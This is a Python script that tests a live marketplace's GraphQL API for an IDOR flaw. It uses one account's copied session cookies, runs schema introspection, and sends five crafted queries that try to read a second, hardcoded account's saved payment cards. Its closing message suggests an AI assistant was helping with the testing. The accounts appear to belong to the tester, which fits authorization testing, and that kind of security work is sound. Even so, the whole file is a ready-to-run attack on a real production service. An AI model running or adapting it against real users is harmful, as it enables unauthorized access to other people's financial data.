#!/usr/bin/env python3
"""
Whatnot IDOR Quick Test
Reads Account A cookies from cookies_a.txt, tests cross-user payment data access.
Account B info (ID + username) is hardcoded from prior session analysis.

Usage:
  1. Save Account A's cookie header value to cookies_a.txt in this folder
  2. Run: python3 idor_quick.py
"""
import requests, json, sys, base64, time

WEB_GQL    = "https://www.whatnot.com/services/graphql/"
B_ID       = "58968144"
B_USERNAME = "anyako0810"

def check_token_expiry(cookies):
    """Decode __Secure-access-token JWT and report expiry status."""
    for part in cookies.split(';'):
        part = part.strip()
        if part.startswith('__Secure-access-token=') and 'expiration' not in part:
            token = part.split('=', 1)[1]
            try:
                payload_b64 = token.split('.')[1]
                payload_b64 += '=' * (4 - len(payload_b64) % 4)
                payload = json.loads(base64.urlsafe_b64decode(payload_b64))
                exp = payload.get('exp', 0)
                now = time.time()
                if exp < now:
                    print(f"  ACCESS TOKEN EXPIRED {int(now - exp)} seconds ago ({int((now-exp)/60)} min ago)")
                    print(f"  You need cookies copied within the last 5 minutes.")
                    return False
                else:
                    print(f"  Access token valid for {int(exp - now)} more seconds")
                    return True
            except Exception as e:
                print(f"  Could not decode token: {e}")
    print("  WARNING: No __Secure-access-token found in cookies_a.txt")
    print("  Make sure you copied the full cookie header value")
    return False

def gql(cookies, query):
    r = requests.post(WEB_GQL, headers={
        "Content-Type": "application/json",
        "X-Whatnot-App": "whatnot-web",
        "X-Whatnot-App-Version": "20260507-1520",
        "X-Whatnot-App-Context": "next-js/browser",
        "Origin": "https://www.whatnot.com",
        "Referer": "https://www.whatnot.com/account/settings/payment",
        "Cookie": cookies,
    }, json={"query": query}, timeout=15)
    return r

def section(title):
    print(f"\n{'='*60}")
    print(f"  {title}")
    print('='*60)

def main():
    try:
        with open("cookies_a.txt") as f:
            cookies = f.read().strip()
    except FileNotFoundError:
        print("ERROR: cookies_a.txt not found.")
        print("Create it: paste Account A's cookie header value into a file called cookies_a.txt")
        sys.exit(1)

    if not cookies or len(cookies) < 20:
        print("ERROR: cookies_a.txt is empty or too short.")
        sys.exit(1)

    # ── Step 1: Confirm Account A auth ────────────────────────────────────────
    section("Step 1: Confirm Account A auth")
    print(f"  Cookie string length: {len(cookies)} chars")
    token_ok = check_token_expiry(cookies)
    if not token_ok:
        print("\n  *** Copy fresh cookies NOW and immediately run: pbpaste > cookies_a.txt && python3 idor_quick.py ***")
        sys.exit(1)

    r = gql(cookies, "{ me { id username } }")
    print(f"HTTP {r.status_code}: {r.text[:300]}")
    try:
        me = r.json().get("data", {}).get("me") or {}
    except Exception:
        me = {}
    a_id = me.get("id")
    a_user = me.get("username")
    if not a_id:
        print("\nERROR: Not authenticated. Cookies are probably expired.")
        print("Get fresh cookies from Chrome DevTools and save to cookies_a.txt, then re-run.")
        sys.exit(1)
    print(f"\nAccount A confirmed: id={a_id}  username={a_user}")

    # ── Step 2: Introspection — find all fields on UserNode ───────────────────
    section("Step 2: UserNode field names (introspection)")
    r = gql(cookies, '{ __type(name: "UserNode") { fields { name } } }')
    print(f"HTTP {r.status_code}")
    try:
        fields = r.json().get("data", {}).get("__type", {}).get("fields", [])
        if fields:
            names = [f["name"] for f in fields]
            # Highlight payment-related fields
            pay_fields = [n for n in names if any(k in n.lower() for k in
                          ["pay", "card", "wallet", "billing", "stripe", "bank", "credit"])]
            print(f"All fields ({len(names)}): {', '.join(names)}")
            print(f"\nPayment-related fields: {pay_fields if pay_fields else 'NONE FOUND'}")
        else:
            print(r.text[:500])
    except Exception:
        print(r.text[:500])

    # ── Step 3: Confirm me.cards works (correct field name confirmed) ─────────
    section("Step 3: Confirm me.cards (own payment data)")
    CARD_QUERY = "cards(first:10) { edges { node { id cardDescription cardReference cardType gateway default } } }"
    r = gql(cookies, f"{{ me {{ id {CARD_QUERY} }} }}")
    print(f"HTTP {r.status_code}: {r.text[:600]}")
    try:
        my_cards = r.json().get("data", {}).get("me", {}).get("cards", {}).get("edges", [])
        if my_cards:
            print(f"\nAccount A has {len(my_cards)} saved card(s) — confirmed field name 'cards' works")
        else:
            print("\nAccount A has no saved cards (field exists, just empty)")
    except Exception:
        pass

    # ── Step 4: IDOR tests — Account A's cookies → Account B's data ──────────
    section(f"Step 4: IDOR tests against Account B (id={B_ID}, username={B_USERNAME})")
    print(f"Goal: read Account B's cards as Account A\n")

    CARD_FRAG = f"cards(first:10) {{ edges {{ node {{ id cardDescription cardReference cardType gateway default }} }} }}"

    queries = [
        ("user(id) direct",
         f'{{ user(id: "{B_ID}") {{ id {CARD_FRAG} }} }}'),
        ("alias me + victim user(id)",
         f'{{ me {{ id }} victim: user(id: "{B_ID}") {{ {CARD_FRAG} }} }}'),
        ("publicUser(username)",
         f'{{ publicUser(username: "{B_USERNAME}") {{ id {CARD_FRAG} }} }}'),
        ("userByUsername",
         f'{{ userByUsername(username: "{B_USERNAME}") {{ id {CARD_FRAG} }} }}'),
        ("profile(username)",
         f'{{ profile(username: "{B_USERNAME}") {{ id {CARD_FRAG} }} }}'),
    ]

    for name, q in queries:
        r = gql(cookies, q)
        print(f"  [{name}]")
        print(f"  HTTP {r.status_code}  {r.text[:500]}")

        try:
            d = r.json()
            for key in ["user", "victim", "publicUser", "userByUsername", "profile"]:
                node = d.get("data", {}).get(key)
                if node:
                    edges = node.get("cards", {}).get("edges", []) if node.get("cards") else []
                    if edges:
                        print(f"\n  *** IDOR CONFIRMED *** {name}")
                        print(f"  Account A (anyakoa) read Account B's (anyako0810) payment cards!")
                        print(f"  Full data: {json.dumps(node)}")
        except Exception:
            pass
        print()

    print("\n" + "="*60)
    print("  Done. Paste the full output above to Claude.")
    print("="*60)

if __name__ == "__main__":
    main()
